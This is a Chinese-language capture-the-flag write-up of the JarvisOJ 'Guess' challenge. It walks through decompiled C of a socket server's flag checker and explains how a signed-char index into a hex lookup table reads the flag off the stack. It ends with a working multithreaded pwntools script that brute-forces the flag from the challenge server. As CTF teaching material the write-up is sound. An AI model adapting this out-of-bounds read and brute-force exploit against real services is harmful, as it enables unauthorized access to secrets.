# JarviOJ Guess

### 0x1 分析

这道题反而感觉不像其他题目，又学到了别样的做法。这里直接分析思路。

`main`:

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  sockaddr_in bind_addr; // [rsp+0h] [rbp-20h]
  pid_t child_pid; // [rsp+14h] [rbp-Ch]
  int s_; // [rsp+18h] [rbp-8h]
  int s; // [rsp+1Ch] [rbp-4h]

  s = socket(2, 1, 0);
  if ( s == -1 )
  {
    perror("unable to create server socket");
    exit(1);
  }
  *(_QWORD *)&bind_addr.sin_family = 0LL;
  *(_QWORD *)bind_addr.sin_zero = 0LL;
  bind_addr.sin_family = 2;
  bind_addr.sin_port = htons(0x270Fu);
  if ( bind(s, (const struct sockaddr *)&bind_addr, 0x10u) )
  {
    perror("unable to bind socket");
    exit(1);
  }
  if ( listen(s, 16) )
  {
    perror("deaf");
    exit(1);
  }
  while ( 1 )
  {
    while ( 1 )
    {
      s_ = accept(s, 0LL, 0LL);
      if ( s_ != -1 )
        break;
      perror("accept failed, is this bad?");
    }
    child_pid = fork();
    if ( child_pid == -1 )
    {
      perror("can't fork! that's bad, I think.");
      close(s_);
      sleep(1u);
    }
    else
    {
      if ( !child_pid )
      {
        close(s);
        handle(s_);
        exit(0);
      }
      close(s_);
    }
  }
}
```

这里很常规，最后`fork()`一个子进程来执行`handle()`函数。

`handle()`

```c
void __cdecl handle(int s)
{
  signed __int64 v1; // rsi
  char inbuf[4096]; // [rsp+10h] [rbp-1010h]
  int correct; // [rsp+101Ch] [rbp-4h]

  alarm(0x78u);
  if ( dup2(s, 0) == -1 || dup2(s, 1) == -1 )
    exit(1);
  v1 = 0LL;
  setbuf(stdout, 0LL);
  puts(
    "Notice: Important!!\n"
    "This is a test program for you to test on localhost.\n"
    "Notice flag in this test program starts with `FAKE{` and the\n"
    "program on server has the real flag which starts with `PCTF{`\n"
    "\n"
    "\n"
    "\n"
    "Welcome to the super-secret flag guess validation system!\n"
    "Unfortunately, it only works for the flag for this challenge though.\n"
    "The correct flag is 50 characters long, begins with `PCTF{` and\n"
    "ends with `}` (without the quotes). All characters in the flag\n"
    "are lowercase hex (so they are in [0-9a-f]).\n"
    "\n"
    "Before you can submit your flag guess, you have to encode the\n"
    "whole guess with hex again (including the `PCTF{` and the `}`).\n"
    "This protects the flag from corruption through network nodes that\n"
    "can't handle non-hex traffic properly, just like in email.\n");
  while ( 1 )
  {
    printf("guess> ", v1);
    v1 = 4096LL;
    if ( !fgets(inbuf, 4096, stdin) )
      break;
    rtrim(inbuf);
    correct = is_flag_correct(inbuf);
    if ( correct )
      puts(
        "Yaaaay! You guessed the flag correctly! But do you still remember what you entered? If not, feel free to try again!");
    else
      puts("Nope.");
  }
}
```

本来看到`fgets`满心欢喜，因为可以栈溢出，但是看到栈区的相应变量`inbuf`就是是一个大小$4096$的数组，希望落空。

接下来判断我们输入的字符串`is_flag_correct(inbuf);`

`is_flag_correct()`

```c
int __cdecl is_flag_correct(char *flag_hex)
{
  unsigned int v1; // eax
  char given_flag[50]; // [rsp+10h] [rbp-190h]
  char flag[50]; // [rsp+50h] [rbp-150h]
  char bin_by_hex[256]; // [rsp+90h] [rbp-110h]
  char value2; // [rsp+192h] [rbp-Eh]
  char value1; // [rsp+193h] [rbp-Dh]
  int i_0; // [rsp+194h] [rbp-Ch]
  char diff; // [rsp+19Bh] [rbp-5h]
  int i; // [rsp+19Ch] [rbp-4h]

  if ( strlen(flag_hex) != 100 )
  {
    v1 = strlen(flag_hex);
    printf("bad input, that hexstring should be 100 chars, but was %d chars long!\n", v1);
    exit(0);
  }
  qmemcpy(bin_by_hex, &unk_401100, sizeof(bin_by_hex));
  qmemcpy(flag, "FAKE{9b355e394d2070ebd0df195d8b234509cc29272bc412}", sizeof(flag));
  bzero(given_flag, 0x32uLL);
  for ( i = 0; i <= 49; ++i )
  {
    value1 = bin_by_hex[flag_hex[2 * i]];
    value2 = bin_by_hex[flag_hex[2 * i + 1]];
    if ( value1 == -1 || value2 == -1 )
    {
      puts("bad input – one of the characters you supplied was not a valid hex character!");
      exit(0);
    }
    given_flag[i] = value2 | 16 * value1;
  }
  diff = 0;
  for ( i_0 = 0; i_0 <= 49; ++i_0 )
    diff |= flag[i_0] ^ given_flag[i_0];
  return diff == 0;
}
```

这里倒是有些玩意。看到最后返回`True`就会返回`handle`函数，告诉我们我们猜到了`flag`。但是依旧没什么头绪。

看了[这篇WP]([https://binlep.github.io/2019/09/24/%E3%80%90WriteUp%E3%80%91Jarvis%20OJ--Pwn%E9%A2%98%E8%A7%A3/#Guess](https://binlep.github.io/2019/09/24/[WriteUp]Jarvis OJ--Pwn题解/#Guess))之后，发现了奇怪的地方。

```c
value1 = bin_by_hex[flag_hex[2 * i]];
value2 = bin_by_hex[flag_hex[2 * i + 1]];
```

这里可以将`value1`和`value2`定向到栈区的某个元素，注意我说的是栈区，不是d单纯的`bin_by_hex`数组里。因为，如果`flag_hex[2 * i]`是负数的话，就可以在其他位置了。

我们看一眼栈。

```assembly
-0000000000000198 flag_hex        dq ?                    ; offset
-0000000000000190 given_flag      db 50 dup(?)
-0000000000000150 flag            db 50 dup(?)
-0000000000000110 bin_by_hex      db 256 dup(?)
-000000000000000E value2          db ?
-000000000000000D value1          db ?
-000000000000000C i_0             dd ?
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005 diff            db ?
-0000000000000004 i               dd ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

所以根据后面的算法：

```c
  for ( i = 0; i <= 49; ++i )
  {
    value1 = bin_by_hex[flag_hex[2 * i]];
    value2 = bin_by_hex[flag_hex[2 * i + 1]];
    if ( value1 == -1 || value2 == -1 )
    {
      puts("bad input – one of the characters you supplied was not a valid hex character!");
      exit(0);
    }
    given_flag[i] = value2 | 16 * value1;
  }
  diff = 0;
  for ( i_0 = 0; i_0 <= 49; ++i_0 )
    diff |= flag[i_0] ^ given_flag[i_0];
```

我们需要构造一个`given_flag[]`和`flag[]`一样，才能pass。

我们只要让`value1`和`value2`前一个是$0$，后一个是`flag[i]`，即可。

这样我们很容易构造出一个完美的`flag_hex[]`来pass。

```python
for i in range(50):
        raw_pay += '0'
        raw_pay += chr(0x40+128+i)
```

然后逐位爆破，即可拿到`flag`。

顺便学着加一个多线程。

### 0x2 EXP

```python
#! /usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
import thread

context.terminal = ['tmux', 'splitw', '-h']

def debug(p, cmd):
  '''cmd = 'b *%d' %(proc_base+breakaddr)'''
  gdb.attach(p, cmd)
  pause()

flag = ['*']*50

def pwn(leak):
  global flag

  p = remote('pwn.jarvisoj.com', 9878)
  p.recv()

  # pass payload
  raw_pay = ''
  for i in range(50):
    raw_pay += '0'
    raw_pay += chr(0x40+128+i)

  # bombing
  for ch in range(128):
    if chr(ch).isalnum() or chr(ch) == '{' or chr(ch) == '}':
      pay = list(raw_pay)
      pay[2*leak] = chr(ch).encode('hex')[0]
      pay[2*leak+1] = chr(ch).encode('hex')[1]
      pay = ''.join(pay)
      p.sendline(pay)
      ret = p.recvline()
      p.recv()
      if ret != 'Nope.\n':
        flag[leak] = chr(ch)
        print chr(ch),
        break
  p.close()


t = []
for i in range(50):
    t.append(threading.Thread(target=pwn, args=(i,)))
    t[i].start()

for i in range(50):
    t[i].join()

print "flag:" + ''.join(flag)
```



